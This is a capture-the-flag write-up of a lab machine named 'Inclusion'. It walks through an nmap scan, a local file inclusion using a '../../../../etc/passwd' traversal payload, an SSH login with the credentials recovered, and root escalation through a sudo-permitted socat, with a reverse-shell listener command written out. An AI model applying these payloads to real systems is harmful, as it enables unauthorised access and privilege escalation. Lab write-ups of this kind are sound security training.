# Inclusion WriteUp

## Lean more about [local file inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) and [remote file inclusion](https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/).

+ **Starting with a nmap scan for open ports**
  
    ``nmap -sV -sC -sT 10.10.26.204``

+ **HTTP is open**
  ```
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 19:20 EET
    Nmap scan report for 10.10.183.94
    Host is up (0.080s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
    |   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
    |_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
    80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
    |_http-title: My blog
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 10.62 seconds

  ```


+ **Let's check the website** 
  
    ![1]

+ **and click an article**
  
    ![2]

    ``?name=lfiattack``

    looks like a file inclusion (no way!)

+ **Let's check /etc/passwd**

    ``../../../../etc/passwd``

    We find a username and password!

    ![3]

+ **ssh into the machine**

    ![4]

    and read the flag

    ![5]

+ **let's check what we can run**

    ``sudo -l``

    if you don't know what ``-l`` does:

    ![6]

    ![7]

+ **Let's read more on what socat does**

    

  ```
    What is socat?

    socat stands for SOcket CAT. It is a utility for data transfer between two addresses.

    What makes socat so versatile is the fact that an address can represent a network socket, any file descriptor, a Unix domain datagram or stream socket, TCP and UDP (over both IPv4 and IPv6), SOCKS 4/4a over IPv4/IPv6, SCTP, PTY, datagram and stream sockets, named and unnamed pipes, raw IP sockets, OpenSSL, or on Linux even any arbitrary network device.

  ```
  [you can learn more about socat here](https://medium.com/@copyconstruct/socat-29453e9fc8a6)

  then straight to [gtfobins](https://gtfobins.github.io/gtfobins/socat/) we go to see how we can exploit socat

+ **getting the root flag**

    run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on my pc

    and 

    ![8]

    on the host.

    Checking back on our terminal,we get:

    ![9]

    All that's left is to get the flag

    ![10]

[1]:./Screenshot_20200314_183209.png
[2]:./Screenshot_20200314_183239.png
[3]:./Screenshot_20200314_183308.png
[4]:./Screenshot_20200314_183724.png
[5]:./Screenshot_20200314_183810.png
[6]:./Screenshot_20200314_190744.png
[7]:./Screenshot_20200314_190801.png
[8]:./Screenshot_20200314_191328.png
[9]:./Screenshot_20200314_191313.png
[10]:./Screenshot_20200314_191404.png